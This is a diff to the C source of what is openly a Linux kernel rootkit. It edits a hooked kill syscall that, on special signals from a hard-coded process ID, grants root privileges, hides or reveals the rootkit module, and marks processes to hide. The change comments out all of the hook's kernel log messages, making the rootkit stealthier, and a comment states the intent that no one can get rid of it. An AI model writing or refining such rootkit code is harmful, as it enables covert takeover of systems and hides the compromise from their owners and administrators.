@@ -33,27 +33,27 @@ static asmlinkage long hook_kill(const struct pt_regs *regs){
     void show_me(void);
 
     if(sig == SIGSUPER && (pid == 14580)){
-        printk(KERN_INFO "signal: %d == SIGSUPER %d | giving root privilges\n", sig, SIGSUPER);
+        // printk(KERN_INFO "signal: %d == SIGSUPER %d | giving root privilges\n", sig, SIGSUPER);
         set_root();
         return orig_kill;
     }else if((sig == SIGINVIS) && (hidden == 0) && (pid == 14580)){
-        printk(KERN_INFO "signal: %d == SIGINVIS %d | hiding the rootkit\n", sig, SIGINVIS);
+        // printk(KERN_INFO "signal: %d == SIGINVIS %d | hiding the rootkit\n", sig, SIGINVIS);
         hide_me();
         hidden = 1;
         return orig_kill;
     }else if((sig == SIGINVIS) && (hidden == 1) && (pid == 14580)){
         /* This is only for testing we don't want anyone to get rid of our rootkit */
-        printk(KERN_INFO "signal: %d == SIGINVIS %d | reavling the rootkit\n", sig, SIGINVIS);
+        // printk(KERN_INFO "signal: %d == SIGINVIS %d | reavling the rootkit\n", sig, SIGINVIS);
         show_me();
         hidden = 0;
         return orig_kill;
     }else if((sig == SIGHIDE)){
-        printk(KERN_INFO "rootkit: hiding process with id %d\n",pid);
+        // printk(KERN_INFO "rootkit: hiding process with id %d\n",pid);
         sprintf(hide_pid, "%d", pid);
         return orig_kill;
     }
 
-    printk(KERN_INFO "***** hacked kill syscall *****\n");
+    //printk(KERN_INFO "***** hacked kill syscall *****\n");
 
     return orig_kill(regs);
 }
